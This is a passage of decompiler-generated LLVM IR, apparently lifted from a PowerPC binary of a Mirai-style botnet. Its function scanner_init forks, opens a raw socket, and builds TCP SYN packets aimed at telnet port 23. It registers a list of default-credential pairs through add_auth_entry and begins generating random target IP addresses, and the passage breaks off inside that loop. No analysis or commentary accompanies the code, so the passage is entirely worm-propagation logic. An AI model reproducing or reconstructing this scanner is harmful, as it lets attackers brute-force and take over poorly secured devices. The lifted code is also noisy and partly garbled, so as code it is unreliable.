  uselistorder i32 65535, { 52, 53, 54, 1, 0, 3, 2, 55, 56, 24, 25, 26, 4, 16, 57, 58, 27, 59, 28, 60, 6, 5, 18, 19, 20, 17, 29, 30, 31, 32, 33, 8, 7, 61, 62, 34, 35, 36, 37, 10, 9, 63, 64, 38, 39, 40, 41, 42, 21, 43, 44, 12, 11, 22, 65, 45, 46, 47, 14, 13, 23, 66, 48, 49, 50, 15, 51, 67 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 17, 2, 39, 40, 41, 42, 43, 44, 45, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 22, 23, 20, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 79, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r8, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %tmp108 = call i32 @__decompiler_undefined_function_0()
  %tmp109 = call i16 @__decompiler_undefined_function_1()
  %tmp110 = call i16 @__decompiler_undefined_function_1()
  %tmp111 = call i8 @__decompiler_undefined_function_2()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %tmp117 = call i64 @__decompiler_undefined_function_3()
  %stack_var_-1928 = alloca i32, align 4
  %stack_var_-1632 = alloca i32, align 4
  %stack_var_-1904 = alloca i32, align 4
  %stack_var_-1932 = alloca i32, align 4
  %stack_var_-1924 = alloca i32, align 4
  %stack_var_-1944 = alloca i32, align 4
  %stack_var_-1760 = alloca i32, align 4
  %stack_var_-1888 = alloca i32, align 4
  %stack_var_-1936 = alloca i32, align 4
  %v0_100072a8 = load i32, i32* @lr, align 4
  store i32 %v0_100072a8, i32* %r0.global-to-local, align 4
  %v0_100072bc = load i32, i32* @r17, align 4
  %v0_100072d0 = load i32, i32* @r22, align 4
  %v0_100072d4 = load i32, i32* @r23, align 4
  %v0_100072d8 = load i32, i32* @r24, align 4
  %v0_100072dc = load i32, i32* @r25, align 4
  %v0_100072e0 = load i32, i32* @r26, align 4
  %v0_100072e4 = load i32, i32* @r27, align 4
  %v0_100072e8 = load i32, i32* @r28, align 4
  %v0_100072ec = load i32, i32* @r29, align 4
  %v0_100072f0 = load i32, i32* @r30, align 4
  store i32 268464896, i32* @lr, align 4
  %v0_100072fc = call i32 @__libc_fork()
  %v1_10007300 = icmp slt i32 %v0_100072fc, 0
  %v3_10007300 = icmp eq i32 %v0_100072fc, 0
  store i1 %v1_10007300, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007300, i1* %cr7_eq.global-to-local, align 1
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %v0_100072fc, i32* @global_var_10021210.150, align 4
  %tmp153 = icmp slt i32 %v0_100072fc, 1
  br i1 %tmp153, label %dec_label_pc_10007368, label %dec_label_pc_10007310

dec_label_pc_10007310:                            ; preds = %dec_label_pc_10007368, %entry
  store i32 %v0_100072a8, i32* %r0.global-to-local, align 4
  store i32 %v0_100072bc, i32* @r17, align 4
  store i32 %v0_100072d0, i32* @r22, align 4
  store i32 %v0_100072d4, i32* @r23, align 4
  store i32 %v0_100072d8, i32* @r24, align 4
  store i32 %v0_100072dc, i32* @r25, align 4
  store i32 %v0_100072e0, i32* @r26, align 4
  store i32 %v0_100072e4, i32* %r27.global-to-local, align 4
  store i32 %v0_100072e8, i32* @r28, align 4
  store i32 %v0_100072ec, i32* @r29, align 4
  store i32 %v0_100072f0, i32* @r30, align 4
  ret i32 %v0_100072fc

dec_label_pc_10007368:                            ; preds = %entry
  %v1_10007368 = icmp slt i32 %v0_100072fc, -1
  %v3_10007368 = icmp eq i32 %v0_100072fc, -1
  store i1 %v1_10007368, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007368, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007368, label %dec_label_pc_10007310, label %dec_label_pc_10007370

dec_label_pc_10007370:                            ; preds = %dec_label_pc_10007368
  store i32 268465012, i32* @lr, align 4
  %v1_10007370 = call i32 @util_local_addr(i32 %v0_100072fc)
  store i32 %v1_10007370, i32* @global_var_100211e0.76, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007380.156 to i32), i32* @lr, align 4
  %v1_1000737c = call i32 @rand_init(i32 %v1_10007370)
  %v0_10007388 = call i32 @__GI_time()
  store i32 %v0_10007388, i32* @global_var_100211f8.152, align 4
  store i32 268465052, i32* @lr, align 4
  %v2_10007398 = call i32 @calloc(i32 256, i32 288)
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_10007398, i32* @global_var_10021208.157, align 4
  store i32 0, i32* %stack_var_-1936, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100073b0

dec_label_pc_100073b0:                            ; preds = %dec_label_pc_100073b0.dec_label_pc_100073b0_crit_edge, %dec_label_pc_10007370
  %v3_100073c4 = phi i32 [ %v3_100073c4.pre, %dec_label_pc_100073b0.dec_label_pc_100073b0_crit_edge ], [ %v2_10007398, %dec_label_pc_10007370 ]
  %v0_100073b4 = phi i32 [ %v0_100073f4, %dec_label_pc_100073b0.dec_label_pc_100073b0_crit_edge ], [ 0, %dec_label_pc_10007370 ]
  %v1_100073c0 = add i32 %v0_100073b4, 1
  store i32 %v1_100073c0, i32* %r7.global-to-local, align 4
  store i32 %v3_100073c4, i32* @r8, align 4
  %v2_100073d4 = mul i32 %v0_100073b4, 288
  %v2_100073dc = add i32 %v2_100073d4, %v3_100073c4
  store i32 %v2_100073dc, i32* @r10, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100073ec = add i32 %v2_100073dc, 4
  %v3_100073ec = inttoptr i32 %v2_100073ec to i32*
  store i32 -1, i32* %v3_100073ec, align 4
  %v0_100073f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100073f0 = load i32, i32* @r10, align 4
  %v2_100073f0 = add i32 %v1_100073f0, 12
  %v3_100073f0 = inttoptr i32 %v2_100073f0 to i32*
  store i32 %v0_100073f0, i32* %v3_100073f0, align 4
  %v0_100073f4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_100073f4, i32* %stack_var_-1936, align 4
  %tmp154 = icmp slt i32 %v1_100073c0, 256
  br i1 %tmp154, label %dec_label_pc_100073b0.dec_label_pc_100073b0_crit_edge, label %dec_label_pc_100073fc

dec_label_pc_100073b0.dec_label_pc_100073b0_crit_edge: ; preds = %dec_label_pc_100073b0
  %v3_100073c4.pre = load i32, i32* @global_var_10021208.157, align 4
  br label %dec_label_pc_100073b0

dec_label_pc_100073fc:                            ; preds = %dec_label_pc_100073b0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  store i32 268465168, i32* @lr, align 4
  %v3_1000740c = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_10007410 = icmp slt i32 %v3_1000740c, -1
  %v3_10007410 = icmp eq i32 %v3_1000740c, -1
  store i1 %v1_10007410, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007410, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_1000740c, i32* %r29.global-to-local, align 4
  store i32 %v3_1000740c, i32* @global_var_1002120c.158, align 4
  %extract.t34 = trunc i64 %tmp117 to i32
  br i1 %v3_10007410, label %dec_label_pc_10007bd4, label %dec_label_pc_10007420

dec_label_pc_10007420:                            ; preds = %dec_label_pc_100073fc
  store i32 3, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 268465200, i32* @lr, align 4
  %v1_1000742c = call i32 @__libc_fcntl(i32 3)
  store i32 4, i32* @r4, align 4
  %v1_10007434 = or i32 %v1_1000742c, 2048
  store i32 %v1_10007434, i32* @r5, align 4
  %v0_10007438 = load i32, i32* @r29, align 4
  store i32 268465220, i32* @lr, align 4
  %v2_10007440 = call i32 @__libc_fcntl(i32 %v0_10007438)
  %v3_10007444 = load i32, i32* @global_var_1002120c.158, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10007454 = ptrtoint i32* %stack_var_-1936 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-1936, align 4
  store i32 268465252, i32* @lr, align 4
  %v5_10007460 = call i32 @__GI_setsockopt(i32 %v3_10007444, i32 0, i32 3, i32 %v2_10007454, i32 4)
  %v1_10007464 = icmp slt i32 %v5_10007460, 0
  %v3_10007464 = icmp eq i32 %v5_10007460, 0
  store i1 %v1_10007464, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007464, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007464, label %dec_label_pc_1000746c, label %dec_label_pc_10007d5c

dec_label_pc_1000746c:                            ; preds = %dec_label_pc_10007420, %dec_label_pc_1000746c
  %v0_1000746c = call i32 @rand_next()
  %v1_10007470 = urem i32 %v0_1000746c, 65536
  store i32 %v1_10007470, i32* @r23, align 4
  %v1_10007474 = icmp ult i32 %v1_10007470, 1023
  %v3_10007474 = icmp eq i32 %v1_10007470, 1023
  store i1 %v1_10007474, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007474, i1* %cr7_eq.global-to-local, align 1
  %tmp155 = icmp ult i32 %v1_10007470, 1024
  br i1 %tmp155, label %dec_label_pc_1000746c, label %dec_label_pc_1000747c

dec_label_pc_1000747c:                            ; preds = %dec_label_pc_1000746c
  store i32 268566528, i32* %r11.global-to-local, align 4
  store i32 5, i32* %r29.global-to-local, align 4
  %v3_10007484 = load i32, i32* @global_var_100212a4.159, align 4
  store i32 %v3_10007484, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100212a4.159 to i32), i32* %r10.global-to-local, align 4
  store i32 268500992, i32* %r27.global-to-local, align 4
  %v1_10007494 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10007494, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10010168.160 to i32), i32* @r27, align 4
  %v1_1000749c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_1000749c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100212b8.161 to i32), i32* @r30, align 4
  store i32 40, i32* %r9.global-to-local, align 4
  store i32 %v1_1000749c, i32* @global_var_100212a4.159, align 4
  store i16 40, i16* bitcast (i32* @global_var_100212a6.162 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_10010174.163 to i32), i32* @r26, align 4
  %v0_100074c4 = call i32 @rand_next()
  %v1_100074c4 = trunc i32 %v0_100074c4 to i16
  %v3_100074c8 = load i32, i32* @global_var_100212c4.164, align 4
  store i32 %v3_100074c8, i32* %r11.global-to-local, align 4
  store i32 64, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100212a4.159 to i32), i32* %r9.global-to-local, align 4
  store i32 268566528, i32* %r10.global-to-local, align 4
  %v1_100074dc = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_100074dc, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100212a4.159 to i32), i32* %r10.global-to-local, align 4
  %v0_100074e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100074e4 = trunc i32 %v0_100074e4 to i8
  store i8 %v1_100074e4, i8* bitcast (i32* @global_var_100212ac.165 to i8*), align 4
  store i32 23, i32* %r0.global-to-local, align 4
  store i16 %v1_100074c4, i16* bitcast (i32* @global_var_100212a8.166 to i16*), align 4
  store i32 6, i32* %r9.global-to-local, align 4
  store i8 6, i8* bitcast (i32* @global_var_100212ad.167 to i8*), align 4
  store i32 %v1_100074dc, i32* @global_var_100212c4.164, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10010150.168 to i32), i32* @r29, align 4
  %v0_10007504 = load i32, i32* @r23, align 4
  %v1_10007504 = trunc i32 %v0_10007504 to i16
  store i16 %v1_10007504, i16* bitcast (i32* @global_var_100212b8.161 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_100100e8.169 to i32), i32* @r28, align 4
  store i16 23, i16* @global_var_100212ba.170, align 2
  store i32 ptrtoint ([8 x i8]* @global_var_100101d0.171 to i32), i32* @r25, align 4
  %v2_10007514 = ptrtoint i32* %stack_var_-1888 to i32
  store i32 %v2_10007514, i32* @r17, align 4
  %v2_10007518 = ptrtoint i32* %stack_var_-1760 to i32
  store i32 %v2_10007518, i32* @r14, align 4
  %v0_1000751c = call i32 @rand_next()
  %v1_1000751c = trunc i32 %v0_1000751c to i16
  store i32 1, i32* %r0.global-to-local, align 4
  store i16 %v1_1000751c, i16* bitcast (i32* @global_var_100212c6.173 to i16*), align 4
  %v0_1000752c = load i32, i32* @r29, align 4
  store i32 %v0_1000752c, i32* @r3, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_10010158.174 to i32), i32* @r4, align 4
  %v3_10007534 = load i32, i32* @global_var_100212c4.164, align 4
  store i32 %v3_10007534, i32* %r9.global-to-local, align 4
  store i32 12, i32* @r5, align 4
  %v2_1000753c = ptrtoint i32* %stack_var_-1944 to i32
  store i32 %v2_1000753c, i32* @r22, align 4
  %v1_10007544 = call i32 @__asm_rlwimi(i32 1, i32 17, i32 14, i32 14)
  store i32 %v1_10007544, i32* %r9.global-to-local, align 4
  store i32 %v1_10007544, i32* @global_var_100212c4.164, align 4
  store i32 268465492, i32* @lr, align 4
  %v0_10007550 = call i32 @add_auth_entry()
  %v0_10007558 = load i32, i32* @r29, align 4
  store i32 %v0_10007558, i32* @r3, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10010160.175 to i32), i32* @r4, align 4
  store i32 9, i32* @r5, align 4
  store i32 268465512, i32* @lr, align 4
  %v0_10007564 = call i32 @add_auth_entry()
  %v0_10007568 = load i32, i32* @r29, align 4
  store i32 %v0_10007568, i32* @r3, align 4
  store i32 13, i32* @r5, align 4
  %v0_10007570 = load i32, i32* @r27, align 4
  store i32 %v0_10007570, i32* @r4, align 4
  store i32 268465528, i32* @lr, align 4
  %v0_10007574 = call i32 @add_auth_entry()
  %v0_10007578 = load i32, i32* @r29, align 4
  store i32 %v0_10007578, i32* @r3, align 4
  store i32 %v0_10007578, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  store i32 268465544, i32* @lr, align 4
  %v0_10007584 = call i32 @add_auth_entry()
  %v0_10007588 = load i32, i32* @r29, align 4
  store i32 %v0_10007588, i32* @r3, align 4
  %v0_1000758c = load i32, i32* @r26, align 4
  store i32 %v0_1000758c, i32* @r4, align 4
  store i32 17, i32* @r5, align 4
  store i32 268465560, i32* @lr, align 4
  %v0_10007594 = call i32 @add_auth_entry()
  %v0_10007598 = load i32, i32* @r29, align 4
  store i32 %v0_10007598, i32* @r3, align 4
  %v0_1000759c = load i32, i32* @r28, align 4
  store i32 %v0_1000759c, i32* @r4, align 4
  store i32 5, i32* @r5, align 4
  store i32 268465576, i32* @lr, align 4
  %v0_100075a4 = call i32 @add_auth_entry()
  %v0_100075ac = load i32, i32* @r29, align 4
  store i32 %v0_100075ac, i32* @r3, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10010254.176 to i32), i32* @r4, align 4
  store i32 9, i32* @r5, align 4
  store i32 268500992, i32* @r29, align 4
  store i32 268465600, i32* @lr, align 4
  %v0_100075bc = call i32 @add_auth_entry()
  store i32 ptrtoint ([4 x i8]* @global_var_10010184.177 to i32), i32* @r3, align 4
  %v0_100075c8 = load i32, i32* @r28, align 4
  store i32 %v0_100075c8, i32* @r4, align 4
  store i32 3, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10010188.178 to i32), i32* @r29, align 4
  store i32 268465624, i32* @lr, align 4
  %v0_100075d4 = call i32 @add_auth_entry()
  store i32 ptrtoint ([5 x i8]* @global_var_10010190.179 to i32), i32* @r4, align 4
  %v0_100075e0 = load i32, i32* @r29, align 4
  store i32 %v0_100075e0, i32* @r3, align 4
  store i32 8, i32* @r5, align 4
  store i32 268465644, i32* @lr, align 4
  %v0_100075e8 = call i32 @add_auth_entry()
  store i32 ptrtoint ([7 x i8]* @global_var_10010198.180 to i32), i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v0_100075f8 = load i32, i32* @r29, align 4
  store i32 %v0_100075f8, i32* @r3, align 4
  store i32 268465664, i32* @lr, align 4
  %v0_100075fc = call i32 @add_auth_entry()
  %v0_10007600 = load i32, i32* @r29, align 4
  store i32 %v0_10007600, i32* @r3, align 4
  %v0_10007604 = load i32, i32* @r28, align 4
  store i32 %v0_10007604, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  store i32 268465680, i32* @lr, align 4
  %v0_1000760c = call i32 @add_auth_entry()
  store i32 ptrtoint ([6 x i8]* @global_var_100101a0.181 to i32), i32* @r4, align 4
  %v0_10007618 = load i32, i32* @r29, align 4
  store i32 %v0_10007618, i32* @r3, align 4
  store i32 9, i32* @r5, align 4
  store i32 268465700, i32* @lr, align 4
  %v0_10007620 = call i32 @add_auth_entry()
  store i32 ptrtoint ([9 x i8]* @global_var_100101a8.182 to i32), i32* @r4, align 4
  %v0_1000762c = load i32, i32* @r29, align 4
  store i32 %v0_1000762c, i32* @r3, align 4
  store i32 12, i32* @r5, align 4
  store i32 268465720, i32* @lr, align 4
  %v0_10007634 = call i32 @add_auth_entry()
  store i32 ptrtoint ([6 x i8]* @global_var_100101b4.183 to i32), i32* @r4, align 4
  %v0_10007640 = load i32, i32* @r29, align 4
  store i32 %v0_10007640, i32* @r3, align 4
  store i32 9, i32* @r5, align 4
  store i32 268465740, i32* @lr, align 4
  %v0_10007648 = call i32 @add_auth_entry()
  store i32 ptrtoint ([6 x i8]* @global_var_100101bc.184 to i32), i32* @r4, align 4
  %v0_10007654 = load i32, i32* @r29, align 4
  store i32 %v0_10007654, i32* @r3, align 4
  store i32 9, i32* @r5, align 4
  store i32 268465760, i32* @lr, align 4
  %v0_1000765c = call i32 @add_auth_entry()
  store i32 ptrtoint ([9 x i8]* @global_var_100101c4.185 to i32), i32* @r4, align 4
  %v0_10007668 = load i32, i32* @r29, align 4
  store i32 %v0_10007668, i32* @r3, align 4
  store i32 12, i32* @r5, align 4
  store i32 268465780, i32* @lr, align 4
  %v0_10007670 = call i32 @add_auth_entry()
  %v0_10007674 = load i32, i32* @r29, align 4
  store i32 %v0_10007674, i32* @r3, align 4
  %v0_10007678 = load i32, i32* @r25, align 4
  store i32 %v0_10007678, i32* @r4, align 4
  store i32 11, i32* @r5, align 4
  store i32 268465796, i32* @lr, align 4
  %v0_10007680 = call i32 @add_auth_entry()
  store i32 ptrtoint ([4 x i8]* @global_var_100101d8.186 to i32), i32* @r4, align 4
  %v0_1000768c = load i32, i32* @r29, align 4
  store i32 %v0_1000768c, i32* @r3, align 4
  store i32 7, i32* @r5, align 4
  store i32 268465816, i32* @lr, align 4
  %v0_10007694 = call i32 @add_auth_entry()
  store i32 ptrtoint ([7 x i8]* @global_var_100101dc.187 to i32), i32* @r4, align 4
  %v0_100076a0 = load i32, i32* @r29, align 4
  store i32 %v0_100076a0, i32* @r3, align 4
  store i32 10, i32* @r5, align 4
  store i32 268465836, i32* @lr, align 4
  %v0_100076a8 = call i32 @add_auth_entry()
  store i32 ptrtoint ([4 x i8]* @global_var_100101e4.188 to i32), i32* @r4, align 4
  %v0_100076b4 = load i32, i32* @r29, align 4
  store i32 %v0_100076b4, i32* @r3, align 4
  store i32 7, i32* @r5, align 4
  store i32 268465856, i32* @lr, align 4
  %v0_100076bc = call i32 @add_auth_entry()
  store i32 ptrtoint ([9 x i8]* @global_var_100101e8.189 to i32), i32* @r4, align 4
  store i32 12, i32* @r5, align 4
  %v0_100076cc = load i32, i32* @r29, align 4
  store i32 %v0_100076cc, i32* @r3, align 4
  store i32 268465876, i32* @lr, align 4
  %v0_100076d0 = call i32 @add_auth_entry()
  %v0_100076d4 = load i32, i32* @r29, align 4
  store i32 %v0_100076d4, i32* @r3, align 4
  %v0_100076d8 = load i32, i32* @r27, align 4
  store i32 %v0_100076d8, i32* @r4, align 4
  store i32 12, i32* @r5, align 4
  store i32 268465892, i32* @lr, align 4
  %v0_100076e0 = call i32 @add_auth_entry()
  %v0_100076e4 = load i32, i32* @r29, align 4
  store i32 %v0_100076e4, i32* @r3, align 4
  %v0_100076e8 = load i32, i32* @r26, align 4
  store i32 %v0_100076e8, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 268465908, i32* @lr, align 4
  %v0_100076f0 = call i32 @add_auth_entry()
  store i32 ptrtoint ([6 x i8]* @global_var_100101f4.190 to i32), i32* @r4, align 4
  %v0_100076fc = load i32, i32* @r29, align 4
  store i32 %v0_100076fc, i32* @r3, align 4
  store i32 9, i32* @r5, align 4
  store i32 268465928, i32* @lr, align 4
  %v0_10007704 = call i32 @add_auth_entry()
  store i32 ptrtoint ([7 x i8]* @global_var_100101fc.191 to i32), i32* @r4, align 4
  %v0_10007710 = load i32, i32* @r29, align 4
  store i32 %v0_10007710, i32* @r3, align 4
  store i32 10, i32* @r5, align 4
  store i32 268465948, i32* @lr, align 4
  %v0_10007718 = call i32 @add_auth_entry()
  store i32 ptrtoint ([11 x i8]* @global_var_10010204.192 to i32), i32* @r4, align 4
  %v0_10007724 = load i32, i32* @r29, align 4
  store i32 %v0_10007724, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268465968, i32* @lr, align 4
  %v0_1000772c = call i32 @add_auth_entry()
  store i32 ptrtoint ([7 x i8]* @global_var_10010210.193 to i32), i32* @r4, align 4
  %v0_10007738 = load i32, i32* @r29, align 4
  store i32 %v0_10007738, i32* @r3, align 4
  store i32 10, i32* @r5, align 4
  store i32 268465988, i32* @lr, align 4
  %v0_10007740 = call i32 @add_auth_entry()
  %v0_10007748 = load i32, i32* @r29, align 4
  store i32 %v0_10007748, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10010218.194 to i32), i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 268466008, i32* @lr, align 4
  %v0_10007754 = call i32 @add_auth_entry()
  %v0_10007758 = load i32, i32* @r25, align 4
  store i32 %v0_10007758, i32* @r3, align 4
  %v0_1000775c = load i32, i32* @r28, align 4
  store i32 %v0_1000775c, i32* @r4, align 4
  store i32 7, i32* @r5, align 4
  store i32 268466024, i32* @lr, align 4
  %v0_10007764 = call i32 @add_auth_entry()
  store i32 ptrtoint ([5 x i8]* @global_var_10010228.195 to i32), i32* @r3, align 4
  store i32 8, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10010228.195 to i32), i32* @r4, align 4
  store i32 268466044, i32* @lr, align 4
  %v0_10007778 = call i32 @add_auth_entry()
  store i32 ptrtoint ([7 x i8]* @global_var_10010230.196 to i32), i32* @r3, align 4
  %v0_10007784 = load i32, i32* @r28, align 4
  store i32 %v0_10007784, i32* @r4, align 4
  store i32 6, i32* @r5, align 4
  store i32 268466064, i32* @lr, align 4
  %v0_1000778c = call i32 @add_auth_entry()
  store i32 ptrtoint ([4 x i8]* @global_var_10010238.197 to i32), i32* @r3, align 4
  %v0_10007798 = load i32, i32* @r28, align 4
  store i32 %v0_10007798, i32* @r4, align 4
  store i32 3, i32* @r5, align 4
  store i32 268466084, i32* @lr, align 4
  %v0_100077a0 = call i32 @add_auth_entry()
  store i32 ptrtoint ([8 x i8]* @global_var_1001023c.198 to i32), i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001023c.198 to i32), i32* @r4, align 4
  store i32 268466104, i32* @lr, align 4
  %v0_100077b4 = call i32 @add_auth_entry()
  store i32 ptrtoint ([11 x i8]* @global_var_10010244.199 to i32), i32* @r3, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_10010250.200 to i32), i32* @r4, align 4
  store i32 18, i32* @r5, align 4
  store i32 268466128, i32* @lr, align 4
  %v0_100077cc = call i32 @add_auth_entry()
  store i32 268500992, i32* %r11.global-to-local, align 4
  store i32 268500992, i32* %r10.global-to-local, align 4
  store i32 1717986919, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v3_100077f8 = load i32, i32* inttoptr (i32 268501320 to i32*), align 8
  store i32 %v3_100077f8, i32* @r24, align 4
  br label %dec_label_pc_100077fc

dec_label_pc_100077fc:                            ; preds = %dec_label_pc_10008804, %dec_label_pc_1000747c
  %stack_var_-96.0.off0 = phi i32 [ 1717986919, %dec_label_pc_1000747c ], [ %stack_var_-96.5.off0, %dec_label_pc_10008804 ]
  %v3_100077fc = load i32, i32* @global_var_100211f8.152, align 4
  store i32 %v3_100077fc, i32* %r29.global-to-local, align 4
  %v0_10007800 = load i32, i32* @r31, align 4
  %v2_10007800 = icmp slt i32 %v0_10007800, %v3_100077fc
  %v4_10007800 = icmp eq i32 %v0_10007800, %v3_100077fc
  store i1 %v2_10007800, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007800, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10007800, label %dec_label_pc_100079f0, label %dec_label_pc_10007808

dec_label_pc_10007808:                            ; preds = %dec_label_pc_100077fc
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-1936, align 4
  br label %dec_label_pc_10007810

dec_label_pc_10007810:                            ; preds = %dec_label_pc_10007918, %dec_label_pc_10007808
  %stack_var_-96.1.off0 = phi i32 [ %stack_var_-96.4.off0, %dec_label_pc_10007918 ], [ %stack_var_-96.0.off0, %dec_label_pc_10007808 ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-1904, align 4
  %v0_10007824 = call i32 @rand_next()
  %v1_10007824 = trunc i32 %v0_10007824 to i16
  %v3_10007828 = load i32, i32* @global_var_100211e0.76, align 4
  store i32 %v3_10007828, i32* %r0.global-to-local, align 4
  %v3_1000782c = load i32, i32* @r24, align 4
  %v4_1000782c = add i32 %v3_1000782c, 4
  %v5_1000782c = inttoptr i32 %v4_1000782c to i16*
  store i16 %v1_10007824, i16* %v5_1000782c, align 2
  %v0_10007830 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007830 = load i32, i32* @r24, align 4
  %v2_10007830 = add i32 %v1_10007830, 12
  %v3_10007830 = inttoptr i32 %v2_10007830 to i32*
  store i32 %v0_10007830, i32* %v3_10007830, align 4
  br label %dec_label_pc_10007834.preheader

dec_label_pc_10007834.preheader:                  ; preds = %dec_label_pc_10007810, %dec_label_pc_100078b0, %dec_label_pc_100078c0, %dec_label_pc_100078c8, %dec_label_pc_100078d0, %dec_label_pc_100078d8, %dec_label_pc_100078e0, %dec_label_pc_100078e8, %dec_label_pc_100078f0, %dec_label_pc_100078f8, %dec_label_pc_10007900, %dec_label_pc_10007908, %dec_label_pc_10007910, %dec_label_pc_10007bdc
  %stack_var_-96.2.off0.ph = phi i32 [ %stack_var_-96.1.off0, %dec_label_pc_10007810 ], [ %stack_var_-96.3.off0, %dec_label_pc_10007910 ], [ %stack_var_-96.3.off0, %dec_label_pc_10007908 ], [ %stack_var_-96.3.off0, %dec_label_pc_10007900 ], [ %stack_var_-96.3.off0, %dec_label_pc_100078f8 ], [ %stack_var_-96.3.off0, %dec_label_pc_100078f0 ], [ %stack_var_-96.3.off0, %dec_label_pc_100078e8 ], [ %stack_var_-96.3.off0, %dec_label_pc_100078e0 ], [ %stack_var_-96.3.off0, %dec_label_pc_100078d8 ], [ %stack_var_-96.3.off0, %dec_label_pc_100078d0 ], [ %stack_var_-96.3.off0, %dec_label_pc_100078c8 ], [ %stack_var_-96.3.off0, %dec_label_pc_100078c0 ], [ %stack_var_-96.3.off0, %dec_label_pc_100078b0 ], [ %stack_var_-96.7.off0, %dec_label_pc_10007bdc ]
  br label %dec_label_pc_10007834

dec_label_pc_10007834:                            ; preds = %dec_label_pc_10007bfc, %dec_label_pc_10007c24, %dec_label_pc_10007c10, %dec_label_pc_10007bf0, %dec_label_pc_100078a8, %dec_label_pc_10007878, %dec_label_pc_10007870, %dec_label_pc_10007860, %dec_label_pc_10007858, %dec_label_pc_10007850, %dec_label_pc_10007834, %dec_label_pc_10007834.preheader
  %v0_10007834 = call i32 @rand_next()
  %v1_10007838 = urem i32 %v0_10007834, 256
  store i32 %v1_10007838, i32* @r11, align 4
  %v1_1000783c = udiv i32 %v0_10007834, 16777216
  store i32 %v1_1000783c, i32* @r10, align 4
  %v1_10007840 = icmp ult i32 %v1_10007838, 127
  %v3_10007840 = icmp eq i32 %v1_10007838, 127
  store i1 %v1_10007840, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007840, i1* %cr7_eq.global-to-local, align 1
  %v1_10007844 = call i32 @__asm_rlwinm(i32 %v0_10007834, i32 24, i32 24, i32 31)
  store i32 %v1_10007844, i32* @r9, align 4
